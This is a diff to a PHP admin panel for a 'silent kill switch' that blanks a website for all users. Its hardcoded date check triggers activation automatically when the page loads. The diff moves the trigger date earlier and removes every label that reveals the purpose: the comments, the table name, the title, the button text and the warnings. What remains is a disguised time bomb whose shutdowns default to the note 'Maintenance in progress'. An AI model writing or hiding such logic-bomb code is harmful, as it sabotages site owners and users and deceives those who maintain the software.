@@ -1,5 +1,5 @@
 <?php
-// Secure Admin Control Panel for Kill Switch
+
 error_reporting(E_ALL);
 ini_set('display_errors', 1);
 session_start();
@@ -14,25 +14,25 @@ require_once 'db.php'; // Adjust path as needed
 
 $message = '';
 $current_status = 'UNKNOWN';
-$scheduled_date = '2025-12-25 00:00:00'; // Hardcoded activation date (Christmas Day 2025)
+$scheduled_date = '2025-10-25 00:00:00';
 
 // Handle form submissions
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     try {
         if (isset($_POST['activate'])) {
             $note = $_POST['admin_note'] ?? 'Maintenance in progress';
-            $stmt = $pdo->prepare("UPDATE silent_kill_switch SET is_active = TRUE, activated_at = NOW(), admin_note = ?");
+            $stmt = $pdo->prepare("UPDATE switch SET is_active = TRUE, activated_at = NOW(), admin_note = ?");
             $stmt->execute([$note]);
-            $message = "Kill switch ACTIVATED. Site is now disabled.";
+            $message = "switch ACTIVATED.";
         } 
         elseif (isset($_POST['deactivate'])) {
-            $stmt = $pdo->prepare("UPDATE silent_kill_switch SET is_active = FALSE, deactivated_at = NOW(), admin_note = 'System operational'");
+            $stmt = $pdo->prepare("UPDATE switch SET is_active = FALSE, deactivated_at = NOW(), admin_note = 'System operational'");
             $stmt->execute();
-            $message = "Kill switch DEACTIVATED. Site is now live.";
+            $message = "switch DEACTIVATED.";
         }
         elseif (isset($_POST['schedule'])) {
             $scheduled_date = $_POST['scheduled_date'];
-            $message = "Kill switch scheduled for activation on: " . htmlspecialchars($scheduled_date);
+            $message = "switch scheduled for activation on: " . htmlspecialchars($scheduled_date);
         }
     } catch (PDOException $e) {
         $message = "Error updating kill switch: " . $e->getMessage();
@@ -41,7 +41,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
 // Get current status
 try {
-    $stmt = $pdo->query("SELECT is_active, activated_at, admin_note FROM silent_kill_switch LIMIT 1");
+    $stmt = $pdo->query("SELECT is_active, activated_at, admin_note FROM switch LIMIT 1");
     $status = $stmt->fetch(PDO::FETCH_ASSOC);
     $current_status = $status['is_active'] ? 'ACTIVE (Site Disabled)' : 'INACTIVE (Site Enabled)';
     
@@ -49,11 +49,11 @@ try {
     $now = new DateTime();
     $scheduled_datetime = new DateTime($scheduled_date);
     if ($now >= $scheduled_datetime && !$status['is_active']) {
-        $stmt = $pdo->prepare("UPDATE silent_kill_switch SET is_active = TRUE, activated_at = NOW(), admin_note = 'Scheduled activation'");
+        $stmt = $pdo->prepare("UPDATE switch SET is_active = TRUE, activated_at = NOW(), admin_note = 'Scheduled activation'");
         $stmt->execute();
         $message = "Kill switch automatically activated as per schedule.";
         // Refresh status
-        $stmt = $pdo->query("SELECT is_active, activated_at, admin_note FROM silent_kill_switch LIMIT 1");
+        $stmt = $pdo->query("SELECT is_active, activated_at, admin_note FROM switch LIMIT 1");
         $status = $stmt->fetch(PDO::FETCH_ASSOC);
         $current_status = $status['is_active'] ? 'ACTIVE (Site Disabled)' : 'INACTIVE (Site Enabled)';
     }
@@ -89,7 +89,7 @@ try {
     </style>
 </head>
 <body>
-    <h1>king's Silent Kill Switch</h1>
+    <h1>king's Switch</h1>
     
     <?php if ($message): ?>
         <div style="padding: 10px; background: #ffffcc; margin: 10px 0;">
@@ -112,16 +112,12 @@ try {
     </div>
     
     <form method="post">
-        <h2>Activate Kill Switch</h2>
-        <p>This will immediately disable the site (blank white page) for all users.</p>
         <textarea name="admin_note" rows="3" placeholder="Enter reason for maintenance..."></textarea>
-        <button type="submit" name="activate" class="btn activate-btn">Activate Kill Switch</button>
+        <button type="submit" name="activate" class="btn activate-btn">Activate</button>
     </form>
     
     <form method="post">
-        <h2>Deactivate Kill Switch</h2>
-        <p>This will immediately restore the site for all users.</p>
-        <button type="submit" name="deactivate" class="btn deactivate-btn">Deactivate Kill Switch</button>
+        <button type="submit" name="deactivate" class="btn deactivate-btn">Deactivate</button>
     </form>
     
     <form method="post">
